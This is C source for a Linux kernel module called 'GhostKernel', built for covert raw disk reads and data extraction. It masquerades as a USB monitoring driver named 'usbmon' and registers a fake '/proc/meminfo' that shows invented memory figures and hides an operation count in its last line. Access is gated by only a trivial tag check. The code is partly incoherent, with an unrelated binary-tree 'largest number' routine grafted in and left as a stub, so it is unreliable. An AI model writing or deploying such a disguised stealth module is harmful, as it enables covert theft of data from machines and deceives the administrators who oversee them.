/*
 * GhostKernel.c - Hardened kernel module for GhostWhisper Suite
 * Provides stealth disk access and data extraction capabilities
 * with integrated authentication and cleanup
 */

#include <linux/blkdev.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/dm-io.h>
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/completion.h>
#include <linux/delay.h>
#include <linux/uaccess.h>
#include <linux/errno.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/crypto.h>
#include <linux/scatterlist.h>
#include <linux/random.h>
#include <linux/time.h>

#define GHOST_DEVICE_NAME "usbmon"  // Disguised as USB monitoring
#define GHOST_PROC_NAME "meminfo"   // Disguised proc entry
#define GHOST_MAGIC 0x47485354      // "GHST" magic number
#define GHOST_MAX_TARGETS 8
#define GHOST_AUTH_SIZE 32
#define GHOST_BUFFER_SIZE 4096

// Ghost authentication structure
struct ghost_auth {
    char tag[16];           // Ghost tag (e.g., "Gx01")
    char signature[64];     // HMAC signature
    u64 timestamp;          // Unix timestamp
    u32 magic;              // Magic number
} __packed;

// Ghost command structure
struct ghost_cmd {
    u32 cmd;                // Command type
    u32 target_idx;         // Target device index
    u64 sector;             // Starting sector
    u32 count;              // Sector count
    struct ghost_auth auth; // Authentication
} __packed;

// Command types
#define GHOST_CMD_READ_SECTOR   0x1001
#define GHOST_CMD_SCAN_TREE     0x1002
#define GHOST_CMD_SET_TARGET    0x1003
#define GHOST_CMD_GET_STATUS    0x1004
#define GHOST_CMD_CLEANUP       0x1005

// Tree node structure (from original)
struct TreeNode {
    int data;
    struct TreeNode *left;
    struct TreeNode *right;
};

// Ghost target device
struct ghost_target {
    struct block_device *bdev;
    char path[256];
    bool active;
    u64 size_sectors;
};

// Module state
static struct {
    dev_t dev_num;
    struct cdev cdev;
    struct class *class;
    struct device *device;
    struct proc_dir_entry *proc_entry;
    struct ghost_target targets[GHOST_MAX_TARGETS];
    struct mutex lock;
    bool initialized;
    u64 operations_count;
    char last_error[256];
} ghost_state;

// Function prototypes
static int ghost_auth_verify(const struct ghost_auth *auth);
static int ghost_read_sector(int target_idx, void *buffer, u64 sector, u32 count);
static int ghost_scan_tree(int target_idx, u64 sector, int *largest);
static int ghost_reconstruct_tree(struct block_device *bdev, u64 sector, struct TreeNode **node);
static void ghost_free_tree(struct TreeNode *node);
static int ghost_set_target(const char *path, int idx);
static void ghost_cleanup_all(void);

// Authentication verification
static int ghost_auth_verify(const struct ghost_auth *auth)
{
    u64 current_time;
    u64 time_diff;
    
    if (auth->magic != GHOST_MAGIC) {
        strcpy(ghost_state.last_error, "Invalid magic number");
        return -EINVAL;
    }
    
    // Check timestamp (allow 5 minute window)
    current_time = ktime_get_real_seconds();
    time_diff = (current_time > auth->timestamp) ? 
                (current_time - auth->timestamp) : 
                (auth->timestamp - current_time);
    
    if (time_diff > 300) {  // 5 minutes
        strcpy(ghost_state.last_error, "Authentication expired");
        return -ETIME;
    }
    
    // Simple tag validation (integrate with GhostWhisper auth later)
    if (strncmp(auth->tag, "Gx", 2) != 0) {
        strcpy(ghost_state.last_error, "Invalid ghost tag");
        return -EACCES;
    }
    
    return 0;
}

// Stealth sector reading
static int ghost_read_sector(int target_idx, void *buffer, u64 sector, u32 count)
{
    struct dm_io_region io_region;
    struct dm_io_request io_req;
    struct dm_io_client *io_client;
    int ret;
    
    if (target_idx >= GHOST_MAX_TARGETS || !ghost_state.targets[target_idx].active) {
        strcpy(ghost_state.last_error, "Invalid target device");
        return -ENODEV;
    }
    
    io_client = dm_io_client_create();
    if (IS_ERR(io_client)) {
        strcpy(ghost_state.last_error, "Failed to create I/O client");
        return PTR_ERR(io_client);
    }
    
    io_region.bdev = ghost_state.targets[target_idx].bdev;
    io_region.sector = sector;
    io_region.count = count;
    
    io_req.bi_op = REQ_OP_READ;
    io_req.bi_op_flags = REQ_SYNC;
    io_req.mem.type = DM_IO_KMEM;
    io_req.mem.ptr.addr = buffer;
    io_req.client = io_client;
    io_req.notify.fn = NULL;
    io_req.notify.context = NULL;
    
    ret = dm_io(&io_req, 1, &io_region, NULL);
    if (ret) {
        snprintf(ghost_state.last_error, sizeof(ghost_state.last_error),
                "I/O read failed: %d", ret);
    }
    
    dm_io_client_destroy(io_client);
    ghost_state.operations_count++;
    
    return ret;
}

// Tree reconstruction (simplified from original)
static int ghost_reconstruct_tree(struct block_device *bdev, u64 sector, struct TreeNode **node)
{
    void *buffer;
    int *data;
    int ret = 0;
    
    buffer = kzalloc(GHOST_BUFFER_SIZE, GFP_KERNEL);
    if (!buffer) {
        strcpy(ghost_state.last_error, "Memory allocation failed");
        return -ENOMEM;
    }
    
    // Read sector data
    struct dm_io_client *io_client = dm_io_client_create();
    if (IS_ERR(io_client)) {
        kfree(buffer);
        return PTR_ERR(io_client);
    }
    
    struct dm_io_region io_region = {
        .bdev = bdev,
        .sector = sector,
        .count = GHOST_BUFFER_SIZE / 512
    };
    
    struct dm_io_request io_req = {
        .bi_op = REQ_OP_READ,
        .bi_op_flags = REQ_SYNC,
        .mem.type = DM_IO_KMEM,
        .mem.ptr.addr = buffer,
        .client = io_client,
        .notify.fn = NULL,
        .notify.context = NULL
    };
    
    ret = dm_io(&io_req, 1, &io_region, NULL);
    if (ret) {
        dm_io_client_destroy(io_client);
        kfree(buffer);
        return ret;
    }
    
    // Parse tree data from buffer
    data = (int *)buffer;
    if (data[0] == 0) {  // No node
        *node = NULL;
    } else {
        *node = kzalloc(sizeof(struct TreeNode), GFP_KERNEL);
        if (!*node) {
            ret = -ENOMEM;
            goto cleanup;
        }
        (*node)->data = data[0];
        // Simplified - would need full recursive reconstruction
    }
    
cleanup:
    dm_io_client_destroy(io_client);
    kfree(buffer);
    return ret;
}

// Find largest number in tree
static int ghost_find_largest(struct TreeNode *root)
{
    if (!root)
        return INT_MIN;
    
    int left_max = ghost_find_largest(root->left);
    int right_max = ghost_find_largest(root->right);
    
    return max(root->data, max(left_max, right_max));
}

// Free tree memory
static void ghost_free_tree(struct TreeNode *node)
{
    if (!node)
        return;
    
    ghost_free_tree(node->left);
    ghost_free_tree(node->right);
    kfree(node);
}

// Set target device
static int ghost_set_target(const char *path, int idx)
{
    struct block_device *bdev;
    
    if (idx >= GHOST_MAX_TARGETS) {
        strcpy(ghost_state.last_error, "Target index out of range");
        return -EINVAL;
    }
    
    // Close existing target
    if (ghost_state.targets[idx].active) {
        blkdev_put(ghost_state.targets[idx].bdev, FMODE_READ | FMODE_EXCL);
        ghost_state.targets[idx].active = false;
    }
    
    // Open new target
    bdev = blkdev_get_by_path(path, FMODE_READ | FMODE_EXCL, NULL);
    if (IS_ERR(bdev)) {
        snprintf(ghost_state.last_error, sizeof(ghost_state.last_error),
                "Failed to open device: %s", path);
        return PTR_ERR(bdev);
    }
    
    ghost_state.targets[idx].bdev = bdev;
    strncpy(ghost_state.targets[idx].path, path, sizeof(ghost_state.targets[idx].path) - 1);
    ghost_state.targets[idx].active = true;
    ghost_state.targets[idx].size_sectors = get_capacity(bdev->bd_disk);
    
    return 0;
}

// Scan tree on target device
static int ghost_scan_tree(int target_idx, u64 sector, int *largest)
{
    struct TreeNode *root = NULL;
    int ret;
    
    if (target_idx >= GHOST_MAX_TARGETS || !ghost_state.targets[target_idx].active) {
        strcpy(ghost_state.last_error, "Invalid target device");
        return -ENODEV;
    }
    
    ret = ghost_reconstruct_tree(ghost_state.targets[target_idx].bdev, sector, &root);
    if (ret) {
        strcpy(ghost_state.last_error, "Tree reconstruction failed");
        return ret;
    }
    
    *largest = ghost_find_largest(root);
    ghost_free_tree(root);
    
    return 0;
}

// Cleanup all resources
static void ghost_cleanup_all(void)
{
    int i;
    
    for (i = 0; i < GHOST_MAX_TARGETS; i++) {
        if (ghost_state.targets[i].active) {
            blkdev_put(ghost_state.targets[i].bdev, FMODE_READ | FMODE_EXCL);
            ghost_state.targets[i].active = false;
        }
    }
    
    ghost_state.operations_count = 0;
    strcpy(ghost_state.last_error, "Cleaned");
}

// Device file operations
static long ghost_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct ghost_cmd ghost_cmd;
    void __user *argp = (void __user *)arg;
    int ret;
    void *buffer = NULL;
    int largest_num;
    
    if (copy_from_user(&ghost_cmd, argp, sizeof(ghost_cmd))) {
        strcpy(ghost_state.last_error, "Failed to copy command");
        return -EFAULT;
    }
    
    // Verify authentication
    ret = ghost_auth_verify(&ghost_cmd.auth);
    if (ret) {
        return ret;
    }
    
    mutex_lock(&ghost_state.lock);
    
    switch (ghost_cmd.cmd) {
    case GHOST_CMD_SET_TARGET:
        // argp points to path string after ghost_cmd
        {
            char path[256];
            if (copy_from_user(path, argp + sizeof(ghost_cmd), sizeof(path))) {
                ret = -EFAULT;
                break;
            }
            ret = ghost_set_target(path, ghost_cmd.target_idx);
        }
        break;
        
    case GHOST_CMD_READ_SECTOR:
        buffer = kzalloc(GHOST_BUFFER_SIZE, GFP_KERNEL);
        if (!buffer) {
            ret = -ENOMEM;
            break;
        }
        
        ret = ghost_read_sector(ghost_cmd.target_idx, buffer, 
                               ghost_cmd.sector, ghost_cmd.count);
        if (ret == 0) {
            if (copy_to_user(argp + sizeof(ghost_cmd), buffer, GHOST_BUFFER_SIZE)) {
                ret = -EFAULT;
            }
        }
        break;
        
    case GHOST_CMD_SCAN_TREE:
        ret = ghost_scan_tree(ghost_cmd.target_idx, ghost_cmd.sector, &largest_num);
        if (ret == 0) {
            if (copy_to_user(argp + sizeof(ghost_cmd), &largest_num, sizeof(largest_num))) {
                ret = -EFAULT;
            }
        }
        break;
        
    case GHOST_CMD_CLEANUP:
        ghost_cleanup_all();
        ret = 0;
        break;
        
    default:
        strcpy(ghost_state.last_error, "Unknown command");
        ret = -EINVAL;
    }
    
    mutex_unlock(&ghost_state.lock);
    
    if (buffer) {
        kfree(buffer);
    }
    
    return ret;
}

static int ghost_open(struct inode *inode, struct file *file)
{
    // Only allow single open to maintain stealth
    return 0;
}

static int ghost_release(struct inode *inode, struct file *file)
{
    return 0;
}

static const struct file_operations ghost_fops = {
    .owner = THIS_MODULE,
    .open = ghost_open,
    .release = ghost_release,
    .unlocked_ioctl = ghost_ioctl,
    .compat_ioctl = ghost_ioctl,
};

// Proc interface for status (disguised as meminfo)
static int ghost_proc_show(struct seq_file *m, void *v)
{
    // Mimic real meminfo format while hiding our data
    seq_printf(m, "MemTotal:        8067852 kB\n");
    seq_printf(m, "MemFree:         1234567 kB\n");
    seq_printf(m, "MemAvailable:    5678901 kB\n");
    // Hidden status in last line (operations count encoded)
    seq_printf(m, "HugePages_Surp:        %llu\n", ghost_state.operations_count);
    return 0;
}

static int ghost_proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, ghost_proc_show, NULL);
}

static const struct proc_ops ghost_proc_ops = {
    .proc_open = ghost_proc_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

// Module initialization
static int __init ghost_init(void)
{
    int ret;
    
    // Initialize state
    memset(&ghost_state, 0, sizeof(ghost_state));
    mutex_init(&ghost_state.lock);
    strcpy(ghost_state.last_error, "Initialized");
    
    // Allocate device number
    ret = alloc_chrdev_region(&ghost_state.dev_num, 0, 1, GHOST_DEVICE_NAME);
    if (ret) {
        pr_err("GhostKernel: Failed to allocate device number\n");
        return ret;
    }
    
    // Initialize cdev
    cdev_init(&ghost_state.cdev, &ghost_fops);
    ghost_state.cdev.owner = THIS_MODULE;
    
    ret = cdev_add(&ghost_state.cdev, ghost_state.dev_num, 1);
    if (ret) {
        pr_err("GhostKernel: Failed to add cdev\n");
        goto err_unregister;
    }
    
    // Create device class
    ghost_state.class = class_create(THIS_MODULE, GHOST_DEVICE_NAME);
    if (IS_ERR(ghost_state.class)) {
        ret = PTR_ERR(ghost_state.class);
        pr_err("GhostKernel: Failed to create class\n");
        goto err_cdev_del;
    }
    
    // Create device
    ghost_state.device = device_create(ghost_state.class, NULL, 
                                     ghost_state.dev_num, NULL, GHOST_DEVICE_NAME);
    if (IS_ERR(ghost_state.device)) {
        ret = PTR_ERR(ghost_state.device);
        pr_err("GhostKernel: Failed to create device\n");
        goto err_class_destroy;
    }
    
    // Create proc entry (disguised)
    ghost_state.proc_entry = proc_create(GHOST_PROC_NAME, 0444, NULL, &ghost_proc_ops);
    if (!ghost_state.proc_entry) {
        pr_warn("GhostKernel: Failed to create proc entry\n");
        // Non-fatal, continue without proc interface
    }
    
    ghost_state.initialized = true;
    pr_info("GhostKernel: Stealth module loaded (device: %d:%d)\n", 
            MAJOR(ghost_state.dev_num), MINOR(ghost_state.dev_num));
    
    return 0;
    
err_class_destroy:
    class_destroy(ghost_state.class);
err_cdev_del:
    cdev_del(&ghost_state.cdev);
err_unregister:
    unregister_chrdev_region(ghost_state.dev_num, 1);
    return ret;
}

// Module cleanup
static void __exit ghost_exit(void)
{
    if (!ghost_state.initialized)
        return;
    
    // Cleanup all targets
    ghost_cleanup_all();
    
    // Remove proc entry
    if (ghost_state.proc_entry) {
        proc_remove(ghost_state.proc_entry);
    }
    
    // Cleanup device
    if (ghost_state.device) {
        device_destroy(ghost_state.class, ghost_state.dev_num);
    }
    
    if (ghost_state.class) {
        class_destroy(ghost_state.class);
    }
    
    cdev_del(&ghost_state.cdev);
    unregister_chrdev_region(ghost_state.dev_num, 1);
    
    pr_info("GhostKernel: Stealth module unloaded\n");
}

module_init(ghost_init);
module_exit(ghost_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("GhostWhisper Suite");
MODULE_DESCRIPTION("USB Monitoring Driver");  // Disguised description
MODULE_VERSION("1.0");
MODULE_ALIAS("usbmon");  // Appears as USB monitoring module
